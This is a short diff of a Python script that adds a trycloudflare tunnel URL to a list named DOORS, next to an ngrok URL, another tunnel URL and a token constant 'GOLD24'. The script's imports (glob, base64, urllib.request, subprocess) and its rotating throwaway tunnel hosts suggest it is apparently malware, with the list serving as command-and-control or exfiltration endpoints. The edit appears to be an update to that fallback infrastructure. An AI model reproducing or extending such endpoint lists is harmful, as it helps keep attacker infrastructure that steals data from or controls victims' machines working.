@@ -9,6 +9,7 @@ import os, glob, json, time, base64, urllib.request, subprocess
 
 TOK = "GOLD24"
 DOORS = [
+    "https://fathers-crowd-fraction-vatican.trycloudflare.com",
     "https://retrain-schnapps-upbeat.ngrok-free.dev",
     "https://phantom-analytical-gains-curious.trycloudflare.com",
 ]
